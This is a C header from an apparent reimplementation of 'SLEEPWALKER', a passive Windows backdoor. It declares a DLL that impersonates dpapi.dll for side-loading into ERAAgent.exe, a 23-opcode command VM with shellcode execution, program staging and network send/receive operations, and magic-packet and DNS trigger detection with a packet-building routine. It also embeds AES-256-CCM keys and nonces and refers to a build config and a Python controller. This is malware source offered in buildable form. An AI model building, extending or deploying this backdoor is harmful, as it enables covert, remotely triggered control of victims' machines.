#ifndef SW_CORE_H
#define SW_CORE_H

/*
 * SLEEPWALKER - passive backdoor with a custom 23-opcode command language.
 *
 * Single self-contained unit (mbedTLS-style, statically linked crypto here
 * in C rather than a separate library). 64-bit Windows GUI DLL that
 * impersonates dpapi.dll and is side-loaded into ERAAgent.exe.
 *
 * Reference: https://r136a1.dev/2026/08/24/sleepwalker-a-passive-backdoor-with-its-own-command-language/
 */

#include <stdint.h>
#include <stddef.h>

/* Native typedefs: LONG is 64-bit on Windows; we keep it 64-bit here so
 * InterlockedExchange semantics match. */
typedef long LONG;

#ifdef __cplusplus
extern "C" {
#endif

/* ------------------------------------------------------------------ */
/* File identity                                                       */
/* ------------------------------------------------------------------ */
#define SW_HOST_EXE_NAME        L"ERAAgent.exe"
#define SW_FORWARD_DLL_NAME     L"dpapisvc.dll"

/* ------------------------------------------------------------------ */
/* Crypto constants (recovered by the author)                          */
/*                                                                     */
/* All four values can be overridden per-build from config.json (see   */
/* config.example.json): build/make_swconfig.py regenerates            */
/* build/sw_config_values.h and the Makefile splices it in via         */
/* -include before this header. If nothing in config.json is modified   */
/* (or the file is absent), sw_config_values.h defines nothing and the */
/* built-in defaults below are used, so a stock build is bit-for-bit   */
/* the original. The Python controller reads the same config.json      */
/* (tools/swctl/_cfg.py), so both sides agree.                         */
/* ------------------------------------------------------------------ */
/* The byte values are object-like macros expanding to compound literals, so
 * both the built-in defaults and the config.json overrides (see
 * build/sw_config_values.h) take the same form and the use sites are
 * written identically: SW_AES_KEY(), SW_CONFIG_NONCE(), SW_CRON_XOR_KEY(). */
#ifndef SW_AES_KEY
#define SW_AES_KEY() (const uint8_t[32]){0x74,0x65,0x31,0xFF,0x37,0x8D,0xBB,0x4B,0xB5,0x1D,0x2A,0xA2,0xB1,0xD3,0x8D,0x90,0x53,0x50,0xA9,0x59,0x58,0x31,0x86,0xBA,0xF4,0xC6,0x90,0xF5,0xF3,0x16,0xB3,0xAE}
#endif
#ifndef SW_CONFIG_NONCE
#define SW_CONFIG_NONCE() (const uint8_t[12]){0x3A,0x6D,0x35,0x7F,0xB9,0xBC,0x51,0xEA,0xCC,0x8B,0x85,0x09}
#endif
#ifndef SW_CRON_XOR_KEY
#define SW_CRON_XOR_KEY() (const uint8_t[32]){ 0x90,0xFD,0xFD,0x02 }
#endif
#ifndef SW_CRON_XOR_KEY_LEN
#define SW_CRON_XOR_KEY_LEN 4
#endif
#ifndef SW_SNIFF_XOR_CONST
#define SW_SNIFF_XOR_CONST 0xAAAAu
#endif

#define SW_CONFIG_BLOCK_SIZE 2048

/* Envelope layout: main = 12-byte nonce | 16-byte tag | ciphertext.
 * DNS channel = 7-byte nonce | 4-byte tag | ciphertext.               */
#define SW_NONCE_LEN        12
#define SW_TAG_LEN          16
#define SW_DNS_NONCE_LEN    7
#define SW_DNS_TAG_LEN      4

/* ------------------------------------------------------------------ */
/* Opcodes (23 instructions)                                           */
/* ------------------------------------------------------------------ */
enum {
    /* Basic control */
    SW_OP_EXIT                = 0x06,
    SW_OP_SPAWN_THREAD_SCRIPT = 0x0B,
    /* Timing and scheduling */
    SW_OP_SLEEP_SECONDS       = 0x0C,
    SW_OP_SLEEP_RANDOM        = 0x0D,
    SW_OP_CRON_SCHEDULE       = 0x0E,
    SW_OP_REPEAT_N            = 0x0F,
    SW_OP_LOOP_FOREVER        = 0x10,
    /* Sending data */
    SW_OP_TCP_SEND            = 0x29,
    SW_OP_UDP_SEND            = 0x2A,
    SW_OP_ICMP_SEND           = 0x2B,
    SW_OP_PIPE_SEND           = 0x2C,
    /* Inbound task reception */
    SW_OP_TCP_CONNECT_RECV    = 0x6F,
    SW_OP_TCP_LISTEN_RECV     = 0x70,
    SW_OP_UDP_BIND_RECV       = 0x73,
    SW_OP_PIPE_CLIENT_RECV    = 0x7D,
    SW_OP_PIPE_SERVER_RECV    = 0x7E,
    /* Building and running programs */
    SW_OP_STAGE_WRITE         = 0x32,
    SW_OP_STAGE_VERIFY_EXEC   = 0x33,
    SW_OP_DECOMPRESS_RUN      = 0x1F,
    SW_OP_RUN_SHELLCODE       = 0x65,
    SW_OP_RUN_FILE_SCRIPT     = 0x66,
    /* Trigger detection */
    SW_OP_SNIFF_MAGIC         = 0x87,
    SW_OP_SNIFF_MAGIC_DNS     = 0x88,
    /* Count marker (not an opcode) */
    SW_OP_COUNT               = 23
};

/* ------------------------------------------------------------------ */
/* Process-wide stop flag - polled by every loop                       */
/* ------------------------------------------------------------------ */
extern volatile LONG sw_stop_flag;

/* ------------------------------------------------------------------ */
/* Wire format (length-prefixed, big-endian)                           */
/*   string/blob : varint-length then bytes                            */
/*   u8/u16/u32/u64 : fixed-width big-endian                          */
/*   lzma_properties : fixed 5-byte block                              */
/* ------------------------------------------------------------------ */
typedef struct {
    const uint8_t *p;
    const uint8_t *end;
} sw_reader;

int  sw_read_u8   (sw_reader *r, uint8_t  *out);
int  sw_read_u16  (sw_reader *r, uint16_t *out);
int  sw_read_u32  (sw_reader *r, uint32_t *out);
int  sw_read_u64  (sw_reader *r, uint64_t *out);
int  sw_read_varlen(sw_reader *r, uint32_t *out_len, const uint8_t **out_data);
int  sw_read_string(sw_reader *r, char *dst, size_t dst_cap, uint32_t *out_len);
int  sw_read_blob  (sw_reader *r, const uint8_t **out_data, uint32_t *out_len);
void sw_write_u16  (uint8_t *out, size_t *pos, uint16_t v);
void sw_write_u32  (uint8_t *out, size_t *pos, uint32_t v);
void sw_write_u64  (uint8_t *out, size_t *pos, uint64_t v);
void sw_write_varlen(uint8_t *out, size_t *pos, uint32_t v);
void sw_write_string(uint8_t *out, size_t *pos, const char *s);
void sw_write_blob  (uint8_t *out, size_t *pos, const uint8_t *data, uint32_t len);

/* ------------------------------------------------------------------ */
/* Crypto                                                              */
/* ------------------------------------------------------------------ */
/* AES-256-CCM. `nonce` is 12 bytes; tag is `tag_len` (4..16). AAD is
 * always empty in this build.                                        */
int sw_aes256_ccm_seal (const uint8_t *nonce, uint32_t nonce_len,
                        const uint8_t *pt, uint32_t pt_len,
                        uint8_t *ct, uint8_t *tag, uint32_t tag_len);
int sw_aes256_ccm_open (const uint8_t *nonce, uint32_t nonce_len,
                        const uint8_t *ct, uint32_t ct_len,
                        uint8_t *pt, uint8_t *tag, uint32_t tag_len);

void sw_sha256(const uint8_t *data, uint32_t len, uint8_t digest[32]);
uint32_t sw_crc32(const uint8_t *data, uint32_t len, uint32_t seed);
uint8_t  sw_crc8(const uint8_t *data, uint32_t len);      /* poly 0x31, seed 0 */
int  sw_base32_encode(const uint8_t *in, uint32_t len, char *out, uint32_t cap);
int  sw_base32_decode(const char *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *out_len);

/* DNS label codec: marker_hi | base32(payload) | marker_lo */
int  sw_dns_label_encode(const uint8_t *envelope, uint32_t len, char *out, uint32_t cap);
int  sw_dns_label_decode(const char *label, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *out_len);

/* The 2048-byte pre-sealed bootstrap block.  For the DLL this holds the
 * AES-CCM seal (nonce|tag|ct of the SNIFF_MAGIC instruction); for native
 * unit tests it is zeroed.  sw_decrypt_bootstrap decodes whichever is in
 * flight. */
extern const uint8_t  g_config_block[2048];
extern const uint32_t g_config_block_len;

/* Decrypt the 2048-byte embedded bootstrap block. Returns 0 on success
 * and fills `out` with the (small) decrypted task program.           */
int sw_decrypt_bootstrap(const uint8_t *block, uint32_t block_len,
                         uint8_t *out, uint32_t out_cap, uint32_t *out_len);

/* ------------------------------------------------------------------ */
/* Trigger-packet framing                                              */
/* ------------------------------------------------------------------ */
#define SW_SNIFF_MIN_PACKET    48   /* 0x30 */
#define SW_SNIFF_MIN_LEN_FIELD 28   /* 0x1C */
/* SW_SNIFF_XOR_CONST is defined in the "Active key config" block above. */

/* The magic packet is an arbitrary IP packet validated by six gates in
 * order (failure at any one drops it):
 *   1. packet >= 48 bytes
 *   2. candidate_len = (word[last] ^ word[second-last]) ^ 0xAAAA
 *   3. candidate_len within [0x1C, 2048]
 *   4. byte pair at (packet_len - candidate_len) == SUM of the last two
 *      16-bit words (not XOR)
 *   5. the block the candidate length points to passes its CRC-32
 *   6. the block is an AES-256-CCM envelope that decrypts to a task
 *
 * Layout (P = packet length, E = envelope length = 28 + pt_len):
 *   [ prefix ][ B-byte block ]
 *   block = [ SUM (2, BE) ][ AES env: nonce12|tag16|ct ][ crc32 (4, BE) ][ w1 (2, BE) ][ w2 (2, BE) ]
 *   B = E + 10;  w1 = BE16[P-4], w2 = BE16[P-2];  B = (w1^w2)^0xAAAA;
 *   SUM marker = (w1 + w2) & 0xFFFF at block start = P - B.
 */

/* Build a magic packet that the sniffer will accept.
 * `pt` is the plaintext task program; the function produces an encrypted
 * IPv4-fragmented-looking packet that passes every gate in order.
 */
int sw_magic_packet_build(const uint8_t *pt, uint32_t pt_len,
                          uint8_t *out, uint32_t out_cap, uint32_t *out_len);

/* Validate a magic packet. Returns 1 on success, fills the decrypted
 * task into `task` (cap = task_cap). */
int sw_magic_packet_check(const uint8_t *pkt, uint32_t pkt_len,
                          uint8_t *task, uint32_t task_cap, uint32_t *task_len);

/* ------------------------------------------------------------------ */
/* VM                                                                  */
/* ------------------------------------------------------------------ */
/* Run a fully-decrypted bytecode buffer in the current thread.
 * Returns the number of instructions executed, or -1 on error.
 * Stops at the process-wide stop flag.
 */
int sw_run_bytecode(const uint8_t *code, uint32_t len);

/* Shared 128 KB work area for STAGE_WRITE/STAGE_VERIFY_EXEC. */
#define SW_STAGE_ARENA_SIZE (128u * 1024u)
extern uint8_t sw_stage_arena[SW_STAGE_ARENA_SIZE];
extern uint32_t sw_stage_arena_len;   /* bytes written so far (high-water mark) */

/* ------------------------------------------------------------------ */
/* Host-facing entry points                                            */
/* ------------------------------------------------------------------ */
int sw_handle_raw_packet(const uint8_t *pkt, uint32_t len);
int sw_handle_dns_query(const char *qname, uint32_t qname_len);

/* Extract the question name from a DNS A-query packet (DNS header starts
 * at pkt). Copy the uncompressed qname (NUL-terminated) to `qname` and
 * return its length. Returns -1 on bad input. */
int sw_extract_dns_qname(const uint8_t *pkt, uint32_t pkt_len,
                          char *qname, uint32_t cap);

/* The 7 dpapi exports and their forwarding stubs live in sw_dll.c,
 * which is Windows-only (it uses the loader and registry APIs); the
 * public C ABI is listed in the .def file. */

#ifdef __cplusplus
}
#endif

#endif /* SW_CORE_H */
